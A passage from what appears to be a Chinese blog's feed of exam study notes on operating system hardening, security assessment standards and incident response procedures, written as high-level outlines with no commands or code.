id="Windows系统安全分析"><a href="#Windows系统安全分析" class="headerlink" title="Windows系统安全分析"></a>Windows系统安全分析</h2><ol><li>Windows口令</li><li>Windows恶意代码</li><li>Windows应用软件漏洞</li><li>Windows系统出现的漏洞</li><li>Windows注册表安全</li><li>Windows文件共享安全</li><li>Windows物理临近攻击：使用启动盘引导系统，访问NTFS文件系统</li></ol><h2 id="Windows系统安全增强技术方法与流程"><a href="#Windows系统安全增强技术方法与流程" class="headerlink" title="Windows系统安全增强技术方法与流程"></a>Windows系统安全增强技术方法与流程</h2><p>常见系统安全增强方法：</p><ul><li>安全漏洞打补丁（Patch）</li><li>停止服务和卸载软件</li><li>升级或更换程序</li><li>修改配置或权限</li><li>去除特洛伊等恶意程序</li><li>安装专用的安全工具软件</li></ul><p>系统安全增强步骤：</p><ol><li><p>确认系统安全增强的安全目标和系统的业务用途</p></li><li><p>安装最小化的操作系统</p><p>要求如下：尽量使用英文版Windows操作系统；不要安装不需要的网络协议；使用NTFS分区；删除不必要的服务和组件</p></li><li><p>安装最新系统补丁</p></li><li><p>配置安装的系统服务</p></li><li><p>配置安全策略</p><p>主要有：账户策略、审计策略、远程访问、文件共享等</p></li><li><p>禁用NetBIOS</p></li><li><p>账户安全配置</p><p>禁用默认账号；定期检查账户，尽早发现可疑账户；锁定Guest账户</p></li><li><p>文件系统安全配置</p></li><li><p>配置TCP/IP筛选和ICF</p></li><li><p>禁用光盘或软盘启动</p></li><li><p>使用屏幕保护口令</p></li><li><p>设置应用软件安全</p></li><li><p>安装第三方防护软件</p></li></ol><h2 id="Windows-2000系统安全增强实例"><a href="#Windows-2000系统安全增强实例" class="headerlink" title="Windows 2000系统安全增强实例"></a>Windows 2000系统安全增强实例</h2><ol><li><p>系统启动安全增强</p></li><li><p>账号与口令管理安全增强</p><p>具体措施：</p><ul><li>停掉guest账号</li><li>限制不必要的用户数量</li><li>把系统Administrator账号改名</li><li>创建一个陷阱账号</li><li>设置安全复杂的口令</li><li>设置屏幕保护口令</li><li>不让系统显示上次登录的用户名</li><li>开启口令安全策略</li><li>开启账号策略</li></ul></li><li><p>安装最新系统补丁</p></li><li><p>网络安全增强</p><p>Windows 2000安全增强方面：</p><ul><li>禁止建立空连接</li><li>关闭默认共享</li><li>关闭不必要的网络服务和网络端口</li></ul></li><li><p>安装第三方防护软件</p></li></ol><h2 id="Windows系统典型安全工具与参考规范"><a href="#Windows系统典型安全工具与参考规范" class="headerlink" title="Windows系统典型安全工具与参考规范"></a>Windows系统典型安全工具与参考规范</h2><p>典型安全工具：</p><ul><li>远程安全登录管理工具OpenSSH（开源）</li><li>系统身份认证增强工具Kerberos（开源）</li><li>恶意代码查杀工具ClamAV（开源）、360杀毒、火绒剑</li><li>系统安全检查工具Nmap（开源）、Fport、Sysinternals（工具集成）</li><li>系统安全监测工具Netstat（系统自带）、WinDump（开源）</li></ul><h1 id="UNIX-Linux操作系统安全分析与防护"><a href="#UNIX-Linux操作系统安全分析与防护" class="headerlink" title="UNIX/Linux操作系统安全分析与防护"></a>UNIX/Linux操作系统安全分析与防护</h1><h2 id="UNIX-Linux系统架构"><a href="#UNIX-Linux系统架构" class="headerlink" title="UNIX/Linux系统架构"></a>UNIX/Linux系统架构</h2><p>分为三层：硬件层、系统内核和应用层</p><h2 id="UNIX-Linux安全机制"><a href="#UNIX-Linux安全机制" class="headerlink" title="UNIX/Linux安全机制"></a>UNIX/Linux安全机制</h2><ol><li><p>UNIX/Linux认证</p><p>认证方式：</p><ul><li>基于口令的认证方式</li><li>终端认证</li><li>主机信任机制</li><li>第三方认证</li></ul></li><li><p>UNIX/Linux访问控制</p></li><li><p>UNIX/Linux审计机制</p></li></ol><h2 id="UNIX-Linux系统安全分析"><a href="#UNIX-Linux系统安全分析" class="headerlink" title="UNIX/Linux系统安全分析"></a>UNIX/Linux系统安全分析</h2><ol><li>UNIX/Linux口令/账号安全</li><li>UNIX/Linux可行主机文件安全</li><li>UNIX/Linux应用软件漏洞</li><li>UNIX/Linux的SUID文件安全</li><li>UNIX/Linux的恶意代码</li><li>UNIX/Linux文件系统安全</li><li>UNIX/Linux网络服务安全</li><li>UNIX/Linux系统程序漏洞</li></ol><h2 id="UNIX-Linux系统安全增强方法和流程"><a href="#UNIX-Linux系统安全增强方法和流程" class="headerlink" title="UNIX/Linux系统安全增强方法和流程"></a>UNIX/Linux系统安全增强方法和流程</h2><ol><li><p>UNIX/Linux系统安全增强方法</p><p>常见方法：</p><ul><li>给安全漏洞打补丁</li><li>停止不必要的服务</li><li>升级或更换软件包</li><li>修改系统配置</li><li>安装专用的安全工具软件</li></ul></li><li><p>UNIX/Linux系统安全增强基本流程</p><p><img src="/2020/09/25/%E7%AC%AC19%E7%AB%A0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/系统增强流程.jpg" style="zoom:50%;"></p></li></ol><h2 id="UNIX-Linux系统安全增强技术"><a href="#UNIX-Linux系统安全增强技术" class="headerlink" title="UNIX/Linux系统安全增强技术"></a>UNIX/Linux系统安全增强技术</h2><ol><li>安装系统补丁软件包</li><li>最小化系统网络服务</li><li>设置系统开机保护口令</li><li>弱口令检查</li><li>禁用默认账号</li><li>用SSH增强网络服务安全</li><li>利用tcp_wrapper增强访问控制</li><li>构筑UNIX/Linux主机防火墙</li><li>使用Tripwire或MD5Sum完整性检测工具</li><li>检测LKM后门</li><li>系统安全监测</li></ol><h2 id="Linux安全增强配置参考"><a href="#Linux安全增强配置参考" class="headerlink" title="Linux安全增强配置参考"></a>Linux安全增强配置参考</h2><ol><li>禁止访问重要文件</li><li>禁止不必要的SUID程序</li><li>为LILO增加开机口令</li><li>设置口令最小长度和最短使用时间</li><li>限制远程访问</li><li>用户超时注销</li><li>注销时删除命令记录</li></ol><h2 id="UNIX-Linux安全模块应用参考"><a href="#UNIX-Linux安全模块应用参考" class="headerlink" title="UNIX/Linux安全模块应用参考"></a>UNIX/Linux安全模块应用参考</h2><p>增强Linux安全的主要有插件式身份验证模块框架（PAM）、SELinux等</p><p><img src="/2020/09/25/%E7%AC%AC19%E7%AB%A0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/PAM.jpg" style="zoom:50%;"></p><p><img src="/2020/09/25/%E7%AC%AC19%E7%AB%A0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/SELinux.jpg" style="zoom:50%;"></p><h2 id="UNIX-Linux系统典型安全工具与参考规范"><a href="#UNIX-Linux系统典型安全工具与参考规范" class="headerlink" title="UNIX/Linux系统典型安全工具与参考规范"></a>UNIX/Linux系统典型安全工具与参考规范</h2><p>典型安全工具：</p><ul><li>远程安全登录管理开源工具OpenSSH</li><li>系统身份认证增强开源工具Kerberos</li><li>系统访问控制增强开源工具SELinux、iptables、TCP Wrappers等</li><li>恶意代码查杀工具ClamAV（开源）、Chkrootkit、Rootkit Hunter</li><li>系统安全检查工具Nmap（开源）、John the Ripper、OpenVAS</li><li>系统安全监测工具Netstat、lsof、Snort</li></ul><h1 id="国产操作系统安全分析与防护"><a href="#国产操作系统安全分析与防护" class="headerlink" title="国产操作系统安全分析与防护"></a>国产操作系统安全分析与防护</h1><h2 id="国产操作系统安全分析"><a href="#国产操作系统安全分析" class="headerlink" title="国产操作系统安全分析"></a>国产操作系统安全分析</h2><p>主要安全风险：</p><ol><li>Linux内核的安全风险</li><li>自主研发系统组件的安全</li><li>依赖第三方系统组件的安全</li><li>系统安全配置的安全</li><li>硬件的安全</li></ol><h2 id="国产操作系统安全增强措施"><a href="#国产操作系统安全增强措施" class="headerlink" title="国产操作系统安全增强措施"></a>国产操作系统安全增强措施</h2><ol><li><p>中科方德方舟安全操作系统</p><p>安全特点：</p><ul><li>基于三权分立的管理机制</li><li>强化的身份标识与认证机制</li><li>综合应用多种安全策略，提高系统的安全性</li><li>基于内核层的安全审计</li><li>支持各类通用软件、具有良好的软硬件兼容性</li></ul></li><li><p>中标麒麟安全操作系统</p></li><li><p>中标麒麟可信操作系统</p><p>主要功能：</p><ul><li>提供基于三权分立机制的多项安全功能（身份鉴别、访问控制、数据保护、安全标记、可信路径、安全审计等）和统一的安全控制中心</li><li>支持国内外可信计算规范（TCM/TPCM、TPM2.0）</li><li>支持国家密码管理部门发布的SM2、SM3、SM4等国密算法；兼容主流等软硬件和自主CPU平台</li><li>提供可持续性的安全保障，防止软硬件被篡改和信息被窃取，系统免受攻击</li></ul></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;操作系统安全概述&quot;&gt;&lt;a href=&quot;#操作系统安全概述&quot; class=&quot;headerlink&quot; title=&quot;操作系统安全概述&quot;&gt;&lt;/a&gt;操作系统安全概述&lt;/h1&gt;&lt;p&gt;操作系统的安全可控目标分为两个层面：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;给定一个操作系统，用户能够实现对操作系统的可理解、可修改、可检测、可修复、可保护&lt;/li&gt;
&lt;li&gt;商业用户能够自己主导操作系统的产品化，不受恶意的商业利益绑架或遭受知识产权专利陷阱，操作系统不能被利用危及国家安全&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="信息安全工程师软考" scheme="https://fl4g.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83/"/>
    
    
    <category term="学习笔记" scheme="https://fl4g.cn/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>第18章 网络安全测评技术与标准</title>
    <link href="https://fl4g.cn/2020/09/25/%E7%AC%AC18%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%84%E6%8A%80%E6%9C%AF%E4%B8%8E%E6%A0%87%E5%87%86/"/>
    <id>https://fl4g.cn/2020/09/25/%E7%AC%AC18%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%84%E6%8A%80%E6%9C%AF%E4%B8%8E%E6%A0%87%E5%87%86/</id>
    <published>2020-09-25T06:36:57.000Z</published>
    <updated>2020-09-25T08:33:37.300Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网络安全测评概况"><a href="#网络安全测评概况" class="headerlink" title="网络安全测评概况"></a>网络安全测评概况</h1><p>测评对象包括：信息系统的组成要素或信息系统自身</p><p><img src="/2020/09/25/%E7%AC%AC18%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%84%E6%8A%80%E6%9C%AF%E4%B8%8E%E6%A0%87%E5%87%86/测评对象和内容.jpg" style="zoom:50%;"></p><a id="more"></a><h1 id="网络安全测评类型"><a href="#网络安全测评类型" class="headerlink" title="网络安全测评类型"></a>网络安全测评类型</h1><h2 id="基于测评目标分类"><a href="#基于测评目标分类" class="headerlink" title="基于测评目标分类"></a>基于测评目标分类</h2><p>按照测评目标，分为三种类型：</p><ol><li><p>网络信息系统安全等级测评</p><p>依据国家网络安全等级保护相关法律法规，主要检测和评估安全技术、安全管理</p></li><li><p>网络信息系统安全验收测评</p><p>根据用户申请的项目验收目标和验收范围</p></li><li><p>网络信息系统安全风险测评</p><p>内容包括系统调查、资产分析、威胁分析、技术及管理脆弱性分析、安全功能测试、风险分析</p></li></ol><h2 id="基于测评内容分类"><a href="#基于测评内容分类" class="headerlink" title="基于测评内容分类"></a>基于测评内容分类</h2><p>技术安全测评：物理环境、网络通信、操作系统、数据库系统、应用系统、数据及存储系统等</p><p>管理安全测评：管理机构、管理制度、管理流程、人员管理、系统建设、系统运维等</p><h2 id="基于实施方式分类"><a href="#基于实施方式分类" class="headerlink" title="基于实施方式分类"></a>基于实施方式分类</h2><ol><li><p>安全功能检测</p><p>主要方法：访谈调研、现场查看、文档审查、社会工程、漏洞扫描、渗透测试、形式化分析验证</p></li><li><p>安全管理检测</p><p>主要方法：访谈调研、现场查看、文档审查、安全基线对比、社会工程</p></li><li><p>代码安全审查</p></li><li><p>安全渗透测试</p></li><li><p>信息系统攻击测试</p><p>测试指标：防御攻击等种类与能力</p></li></ol><h2 id="基于测评对象保密性分类"><a href="#基于测评对象保密性分类" class="headerlink" title="基于测评对象保密性分类"></a>基于测评对象保密性分类</h2><ol><li>涉密信息系统测评</li><li>非涉密信息系统测评</li></ol><h1 id="网络安全测评流程与内容"><a href="#网络安全测评流程与内容" class="headerlink" title="网络安全测评流程与内容"></a>网络安全测评流程与内容</h1><h2 id="网络安全等级保护测评流程与内容"><a href="#网络安全等级保护测评流程与内容" class="headerlink" title="网络安全等级保护测评流程与内容"></a>网络安全等级保护测评流程与内容</h2><p><img src="/2020/09/25/%E7%AC%AC18%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%84%E6%8A%80%E6%9C%AF%E4%B8%8E%E6%A0%87%E5%87%86/等保测评内容.jpg" style="zoom:50%;"></p><p>过程：测评准备活动、方案编制活动、现场测评活动、报告编制活动</p><h2 id="网络安全渗透测试流程与内容"><a href="#网络安全渗透测试流程与内容" class="headerlink" title="网络安全渗透测试流程与内容"></a>网络安全渗透测试流程与内容</h2><ol><li><p>委托受理阶段</p><p>确认目标、签署合同和保密协议</p></li><li><p>准备阶段</p><p>签订授权书，制定方案</p></li><li><p>实施阶段</p><p>执行测试，完成后整理报告</p></li><li><p>综合评估阶段</p><p>汇总分析，报告评审。复测并出具报告。</p></li><li><p>结题阶段</p><p>提交生成的各类文档记录</p></li></ol><h1 id="网络安全测评技术与工具"><a href="#网络安全测评技术与工具" class="headerlink" title="网络安全测评技术与工具"></a>网络安全测评技术与工具</h1><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p>常用漏洞扫描工具：网络安全漏洞扫描器、主机安全漏洞扫描器、数据库安全漏洞扫描器、Web应用安全漏洞扫描器。</p><h2 id="安全渗透测试"><a href="#安全渗透测试" class="headerlink" title="安全渗透测试"></a>安全渗透测试</h2><p>三种类型：</p><ol><li>黑盒模型</li><li>白盒模型</li><li>灰盒模型</li></ol><h2 id="代码安全审查"><a href="#代码安全审查" class="headerlink" title="代码安全审查"></a>代码安全审查</h2><p>代码安全缺陷类型：缓冲区溢出、代码注入、跨站脚本、输入验证、API误用、密码管理、配置错误、危险函数等。</p><h2 id="协议分析"><a href="#协议分析" class="headerlink" title="协议分析"></a>协议分析</h2><p><strong>TCPDump使用</strong>详见P386-P389</p><h2 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h2><p>常用工具：新年监测工具（系统自带）、Apache JMeter（开源）、LoadRunner、SmartBits</p><h1 id="网络安全测评质量管理与标准"><a href="#网络安全测评质量管理与标准" class="headerlink" title="网络安全测评质量管理与标准"></a>网络安全测评质量管理与标准</h1><h2 id="网络安全测评质量管理"><a href="#网络安全测评质量管理" class="headerlink" title="网络安全测评质量管理"></a>网络安全测评质量管理</h2><p>工作包括：测评机构建立质量管理体系、测评实施人员管理、测评实施设备管理、测评实施方法管理、测评实施文件控制、测评非符合性工作控制、体系运行监督、持续改进。</p><h2 id="网络安全测评标准"><a href="#网络安全测评标准" class="headerlink" title="网络安全测评标准"></a>网络安全测评标准</h2><ol><li>信息系统安全等级保护测评标准<ul><li>计算机信息系统 安全保护等级划分准则（GB 17859-1999）</li><li>信息安全技术 网络安全等级保护基本要求（GB/T 22239-2019）</li><li>信息安全技术 网络安全等级保护定级指南（GB/T 22240-2020）</li><li>信息安全技术 网络安全等级保护安全设计技术要求（GB/T25070-2019）</li><li>信息安全技术 网络安全等级保护实施指南（GB/T 25058-2019）</li><li>信息安全技术 信息系统安全工程管理要求（GB/T 20282-2006）</li><li>信息安全技术 应用软件系统安全等级保护通用技术指南（GA/T 711-2007）</li><li>信息安全技术 网络安全等级保护级别要求 第2部分：云计算安全扩展要求（GA/T 1390.2-2017）</li><li>信息安全技术 网络安全等级保护级别要求 第3部分：移动互联安全扩展要求（GA/T 1390.3-2017）</li><li>信息安全技术 网络安全等级保护级别要求 第5部分：工业控制系统安全扩展要求（GA/T 1390.5-2017）</li></ul></li><li>产品测评标准<ul><li>信息技术 安全技术 信息技术安全评估准则（GB/T 18336-2015）</li><li>信息安全技术 路由器安全技术要求（GB/T 18018-2019）</li><li>信息安全技术 路由器安全评估准则（GB/T 20011-2005）</li><li>信息安全技术 服务器安全技术要求（GB/T 21028-2007）</li><li>信息安全技术 服务器安全测评要求（GB/T 25063-2010）</li><li>信息安全技术 网络交换机安全技术要求（GB/T 21050-2019）</li><li>信息安全技术 数据库管理系统安全评估准则（GB/T 20009-2019）</li><li>信息安全技术 数据库管理系统安全技术要求（GB/T 20273-2019）</li><li>信息安全技术 操作系统安全评估准则（GB/T 20008-2005）</li><li>信息安全技术 操作系统安全技术要求（GB/T 20272-2019）</li><li>信息安全技术 网络入侵监测系统技术要求和测评评价方法（GB/T20275-2013）</li><li>信息安全技术 网络和终端隔离产品测试评价方法（GB/T 20277-2015）</li><li>信息安全技术 网络脆弱性扫描产品测试评价方法（GB/T 20280-2006）</li><li>信息安全技术 防火墙安全技术要求和测试评价方法（GB/T 20281-2020）</li><li>信息安全技术 Web应用防火墙安全技术要求与测试评价方法（GB/T 32917-2016）</li><li>信息安全技术 信息系统安全审计产品技术要求和测试评价方法（GB/T 20945-2013）</li><li>信息安全技术 网络型入侵防御产品技术要求和测试评价方法（GB/T 28451-2012）</li><li>信息安全技术 数据备份与恢复产品技术要求与测试评价方法（GB/T 29765-2013）</li><li>信息安全技术 信息系统安全管理平台技术要求和测试评价方法（GB/T 34990-2017）</li><li>信息安全技术 移动终端安全保护技术要求（GB/T 35278-2017）</li></ul></li><li>信息安全风险评估标准<ul><li>信息安全技术 信息安全风险评估规范（GB/T 20984-2007）</li><li>信息安全技术 信息安全风险评估实施指南（GB/T 31509-2015）</li><li>信息安全技术 信息安全风险处理实施指南（GB/T 33132-2016）</li></ul></li><li>密码应用安全<ul><li>安全芯片密码检测准则（GM/T 0008-2012）</li><li>可信计算 可信密码模块符合性检测规范（GM/T 0013-2012）</li><li>密码模块安全技术要求（GM/T 0028-2014）</li><li>服务器密码机技术规范（GM/T 0030-2014）</li><li>基于角色的授权管理与访问控制技术规范（GM/T 0032-2014）</li><li>证书认证系统检测规范（GM/T 0037-2014）</li><li>密码模块安全检测要求（GM/T 0039-2015）</li><li>数字证书互操作检测规范（GM/T 0043-2015）</li><li>金融数据密码机检测规范（GM/T 0046-2016）</li></ul></li><li>工业控制系统信息安全防护能力评估<ul><li>工业控制系统信息安全防护指南（工信部信软（2016）338号）</li><li>工业控制系统信息安全防护能力评估工作管理办法（工信部信软（2017）188号）</li></ul></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;网络安全测评概况&quot;&gt;&lt;a href=&quot;#网络安全测评概况&quot; class=&quot;headerlink&quot; title=&quot;网络安全测评概况&quot;&gt;&lt;/a&gt;网络安全测评概况&lt;/h1&gt;&lt;p&gt;测评对象包括：信息系统的组成要素或信息系统自身&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/09/25/%E7%AC%AC18%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%84%E6%8A%80%E6%9C%AF%E4%B8%8E%E6%A0%87%E5%87%86/测评对象和内容.jpg&quot; style=&quot;zoom:50%;&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="信息安全工程师软考" scheme="https://fl4g.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83/"/>
    
    
    <category term="学习笔记" scheme="https://fl4g.cn/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>第17章 网络安全应急响应技术原理与应用</title>
    <link href="https://fl4g.cn/2020/09/25/%E7%AC%AC17%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/"/>
    <id>https://fl4g.cn/2020/09/25/%E7%AC%AC17%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/</id>
    <published>2020-09-25T02:59:18.000Z</published>
    <updated>2020-09-25T06:35:03.193Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网络安全应急响应概述"><a href="#网络安全应急响应概述" class="headerlink" title="网络安全应急响应概述"></a>网络安全应急响应概述</h1><p>对网络安全事件进行监测、预警、分析、响应和恢复等工作。</p><p><img src="/2020/09/25/%E7%AC%AC17%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/法律要求.jpg" style="zoom:50%;"></p><a id="more"></a><h1 id="网络安全应急响应组织建立与工作机制"><a href="#网络安全应急响应组织建立与工作机制" class="headerlink" title="网络安全应急响应组织建立与工作机制"></a>网络安全应急响应组织建立与工作机制</h1><h2 id="网络安全应急响应组织建立"><a href="#网络安全应急响应组织建立" class="headerlink" title="网络安全应急响应组织建立"></a>网络安全应急响应组织建立</h2><p>构成：应急领导组和应急技术支撑组</p><p>成员组成：管理、业务、技术、行政后勤等人员</p><p>工作：</p><ul><li>网络安全威胁情报分析研究</li><li>网络安全事件监测与分析</li><li>网络安全预警信息发布</li><li>网络安全应急响应预案编写与修订</li><li>网络安全应急响应知识库开发与管理</li><li>网络安全应急响应演练</li><li>网络安全事件响应和处置</li><li>网络安全事件分析和总结</li><li>网络安全教育与培训</li></ul><h2 id="网络安全应急响应组织工作机制"><a href="#网络安全应急响应组织工作机制" class="headerlink" title="网络安全应急响应组织工作机制"></a>网络安全应急响应组织工作机制</h2><p>对组织机构对网络安全事件进行处理、协调或提供支持的团队</p><h2 id="网络安全应急响应组织类型"><a href="#网络安全应急响应组织类型" class="headerlink" title="网络安全应急响应组织类型"></a>网络安全应急响应组织类型</h2><p>应急响应组分为：</p><ol><li>公益性应急响应组</li><li>内部应急响应组</li><li>商业性应急响应组</li><li>厂商应急响应组</li></ol><h1 id="网络安全应急响应预案内容与类型"><a href="#网络安全应急响应预案内容与类型" class="headerlink" title="网络安全应急响应预案内容与类型"></a>网络安全应急响应预案内容与类型</h1><h2 id="网络安全事件类型与分级"><a href="#网络安全事件类型与分级" class="headerlink" title="网络安全事件类型与分级"></a>网络安全事件类型与分级</h2><p>安全事件分为：恶意程序事件、网络攻击事件、信息破坏事件、信息内容安全事件、设备设施故障、灾害性事件和其他信息安全事件</p><p>网络安全事件分为四级：</p><p><img src="/2020/09/25/%E7%AC%AC17%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/等级划分-1.jpg" style="zoom:50%;"></p><p><img src="/2020/09/25/%E7%AC%AC17%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/等级划分-2.jpg" style="zoom:50%;"></p><h2 id="网络安全应急响应预案内容"><a href="#网络安全应急响应预案内容" class="headerlink" title="网络安全应急响应预案内容"></a>网络安全应急响应预案内容</h2><p>基本内容：</p><ul><li>详细列出系统紧急情况的类型及处理措施</li><li>事件处理基本工作流程</li><li>应急处理所要采取的具体步骤及操作顺序</li><li>执行应急预案有关人员的姓名、住址、电话号码以及有关职能部门的联系方法</li></ul><h2 id="网络安全应急响应预案类型"><a href="#网络安全应急响应预案类型" class="headerlink" title="网络安全应急响应预案类型"></a>网络安全应急响应预案类型</h2><p>按照覆盖的管理区域分为：国家级、区域级、行业级、部门级</p><p><strong>核心业务系统、门户网站、外部电源中断、黑客入侵</strong>等应急处置程序参考模版详见P358-P359</p><h1 id="常见网络安全应急事件场景与处理流程"><a href="#常见网络安全应急事件场景与处理流程" class="headerlink" title="常见网络安全应急事件场景与处理流程"></a>常见网络安全应急事件场景与处理流程</h1><h2 id="常见网络安全应急处理场景"><a href="#常见网络安全应急处理场景" class="headerlink" title="常见网络安全应急处理场景"></a>常见网络安全应急处理场景</h2><ol><li>恶意程序事件</li><li>网络攻击事件</li><li>网站及Web应用安全事件</li><li>拒绝服务事件</li></ol><h2 id="网络安全应急处理流程"><a href="#网络安全应急处理流程" class="headerlink" title="网络安全应急处理流程"></a>网络安全应急处理流程</h2><ol><li><p>安全事件报警</p></li><li><p>安全事件确认</p></li><li><p>启动应急预案</p></li><li><p>安全事件处理</p><p>主要工作：</p><ul><li>准备工作：通知相关人员，交换必要信息</li><li>检测工作：对现场做快照，保护一切可能作为证据的记录</li><li>抑制工作：采取围堵措施，尽量限制攻击涉及的范围</li><li>根除工作：解决问题，采取补救措施。对事故进行存档</li><li>恢复工作：恢复系统，使系统正常运行</li><li>总结工作：提交事故处理报告</li></ul></li><li><p>撰写安全事件报告</p><p>报告内容：</p><ul><li>安全事件发生对日期</li><li>参加人员</li><li>事件发现的途径</li><li>事件类型</li><li>事件涉及的范围</li><li>现场记录</li><li>事件导致的损失和影响</li><li>事件处理的过程</li><li>从本次事故中应该吸取的经验与教训</li></ul></li><li><p>应急工作总结</p></li></ol><h2 id="网络安全事件应急演练"><a href="#网络安全事件应急演练" class="headerlink" title="网络安全事件应急演练"></a>网络安全事件应急演练</h2><p><img src="/2020/09/25/%E7%AC%AC17%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/应急演练类型-1.jpg" style="zoom:50%;"></p><p><img src="/2020/09/25/%E7%AC%AC17%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/应急演练类型-2.jpg" style="zoom:50%;"></p><h1 id="网络安全应急响应技术与常见工具"><a href="#网络安全应急响应技术与常见工具" class="headerlink" title="网络安全应急响应技术与常见工具"></a>网络安全应急响应技术与常见工具</h1><h2 id="网络安全应急响应技术概况"><a href="#网络安全应急响应技术概况" class="headerlink" title="网络安全应急响应技术概况"></a>网络安全应急响应技术概况</h2><p><img src="/2020/09/25/%E7%AC%AC17%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/常用技术.jpg" style="zoom:50%;"></p><h2 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h2><p>技术手段：网络访问控制、主机访问控制、数据库访问控制、应用服务访问控制等</p><h2 id="网络安全评估"><a href="#网络安全评估" class="headerlink" title="网络安全评估"></a>网络安全评估</h2><p>评估方法：</p><ol><li>恶意代码检测</li><li>漏洞扫描</li><li>文件完整性检查</li><li>系统配置文件检查</li><li>网卡混杂模式检查（是否安装了网络嗅探器）</li><li>文件系统检查</li><li>日志文件审查</li></ol><h2 id="网络安全监测"><a href="#网络安全监测" class="headerlink" title="网络安全监测"></a>网络安全监测</h2><ol><li>网络流量监测：工具有TCPDump、TCPView、Snort、WireShark、netstat</li><li>系统自身监测：包括受害系统等网络通信状态监测、受害系统等操作系统进程活动状态监测（ps）、受害系统等用户活动状况监测（who命令）、受害系统的地址解析状况监测（arp）、受害系统的进程资源使用状况监测（lsof、fport）</li></ol><h2 id="系统恢复"><a href="#系统恢复" class="headerlink" title="系统恢复"></a>系统恢复</h2><p>技术方法：</p><ol><li><p>系统紧急启动（系统紧急启动盘保存操作系统最小化启动相关文件）</p></li><li><p>恶意代码清除</p></li><li><p>系统漏洞修补</p></li><li><p>文件删除恢复</p></li><li><p>系统备份容灾</p><p>技术：磁盘阵列、双机热备系统、容灾中心等</p><p>《信息安全技术 信息系统灾难恢复规范（GB/T 20988-2007）》规范定义了六个灾难恢复等级和技术要求，：</p><ol><li>第1级-基本支持</li><li>第2级-备用场地支持</li><li>第3级-电子传输和部分设备支持</li><li>第4级-电子传输及完整设备支持</li><li>第5级-实时数据传输及完整设备支持</li><li>第6级-数据零丢失和远程集群支持</li></ol></li></ol><h2 id="入侵取证"><a href="#入侵取证" class="headerlink" 